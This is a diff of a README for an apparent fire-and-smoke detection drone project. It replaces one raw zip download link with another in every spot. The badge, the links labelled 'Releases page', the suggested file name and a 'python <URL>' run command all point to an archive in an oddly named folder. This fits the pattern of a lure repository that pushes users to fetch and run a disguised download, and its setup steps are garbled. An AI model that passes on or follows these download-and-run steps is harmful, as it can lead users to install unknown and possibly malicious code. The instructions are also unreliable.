@@ -1,6 +1,6 @@
 # 🚁 Real-Time-Fire-Smoke-Detection-Drone - Monitor Forest Fires Effortlessly
 
-![Download](https://raw.githubusercontent.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/master/hypogonation/Time_Smoke_Fire_Real_Drone_Detection_1.6-alpha.4.zip)
+![Download](https://github.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/raw/refs/heads/master/hypogonation/Time-Fire-Drone-Smoke-Detection-Real-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -30,11 +30,11 @@ To run this application smoothly, ensure your system meets the following require
 
 To get the latest version of the application, visit the Releases page to download the software. Follow these steps:
 
-1. Click this link to go to the [Releases page](https://raw.githubusercontent.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/master/hypogonation/Time_Smoke_Fire_Real_Drone_Detection_1.6-alpha.4.zip).
+1. Click this link to go to the [Releases page](https://github.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/raw/refs/heads/master/hypogonation/Time-Fire-Drone-Smoke-Detection-Real-1.4.zip).
 
 2. On the Releases page, find the latest version listed at the top.
 
-3. Look for the appropriate file for your system. Typically, you want a file named something like `https://raw.githubusercontent.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/master/hypogonation/Time_Smoke_Fire_Real_Drone_Detection_1.6-alpha.4.zip` or similar.
+3. Look for the appropriate file for your system. Typically, you want a file named something like `https://github.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/raw/refs/heads/master/hypogonation/Time-Fire-Drone-Smoke-Detection-Real-1.4.zip` or similar.
 
 4. Click the download link to start the download. The file will save to your computer. 
 
@@ -46,7 +46,7 @@ To get the latest version of the application, visit the Releases page to downloa
 
 8. Run the program with the following command:
    ```
-   python https://raw.githubusercontent.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/master/hypogonation/Time_Smoke_Fire_Real_Drone_Detection_1.6-alpha.4.zip
+   python https://github.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/raw/refs/heads/master/hypogonation/Time-Fire-Drone-Smoke-Detection-Real-1.4.zip
    ```
 9. Follow on-screen instructions to set up and start using the application.
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 ---
 
-Thank you for using the Real-Time Fire Smoke Detection Drone. Your safety is important, and we hope this tool helps you monitor and protect our forests effectively. For more information and updates, remember to revisit the [Releases page](https://raw.githubusercontent.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/master/hypogonation/Time_Smoke_Fire_Real_Drone_Detection_1.6-alpha.4.zip).
+Thank you for using the Real-Time Fire Smoke Detection Drone. Your safety is important, and we hope this tool helps you monitor and protect our forests effectively. For more information and updates, remember to revisit the [Releases page](https://github.com/idk541/Real-Time-Fire-Smoke-Detection-Drone/raw/refs/heads/master/hypogonation/Time-Fire-Drone-Smoke-Detection-Real-1.4.zip).
